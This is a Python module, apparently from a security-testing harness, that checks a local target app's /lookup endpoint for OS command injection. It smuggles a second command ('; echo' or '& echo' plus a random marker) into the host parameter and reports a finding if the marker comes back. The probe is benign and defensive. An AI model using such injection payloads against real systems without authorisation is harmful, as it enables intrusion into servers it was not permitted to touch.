# sentinel/attacks/cmdi.py
"""
F-03: Command Injection on the /lookup endpoint.

Strategy: rather than dumping /etc/passwd on every single test run
(noisy, and technically riskier output to be passing around), inject
an `echo` of a random marker string. If that marker shows up in the
response, arbitrary command execution is proven, cleanly and
repeatably, without needing to rely on a specific file existing at a
specific path.

Cross-platform: tries Windows-style '& echo' and Unix-style '; echo'
so the attack works regardless of the OS the server runs on.
"""
import sys
import requests
import secrets

FINDING_ID = "F-03"
TITLE = "OS Command Injection in Diagnostic Lookup Endpoint"
SEVERITY = "Critical"
AFFECTED_COMPONENT = "target_app/routes/utils.py :: GET /lookup"

# On Windows cmd.exe uses '&' to chain commands; POSIX shells use ';'.
# Build both so we detect the injection regardless of which shell is active.
_SEPARATORS = ["&", ";"] if sys.platform == "win32" else [";", "&"]


def attack(base_url: str = "http://localhost:8001") -> dict:
    result = {
        "finding_id": FINDING_ID,
        "title": TITLE,
        "severity": SEVERITY,
        "affected_component": AFFECTED_COMPONENT,
        "vulnerable": False,
        "evidence": None,
        "error": None,
    }

    marker = f"SENTINEL_CMDI_{secrets.token_hex(4)}"

    for sep in _SEPARATORS:
        payload = f"127.0.0.1 {sep} echo {marker}"
        try:
            r = requests.get(f"{base_url}/lookup", params={"host": payload}, timeout=5)
        except requests.RequestException as e:
            result["error"] = f"Could not reach target: {e}"
            return result

        if r.status_code != 200:
            continue

        output = r.text
        if marker in output:
            result["vulnerable"] = True
            result["evidence"] = {
                "payload": payload,
                "marker_injected": marker,
                "raw_output": output,
            }
            return result

    return result


if __name__ == "__main__":
    import json
    print(json.dumps(attack(), indent=2))
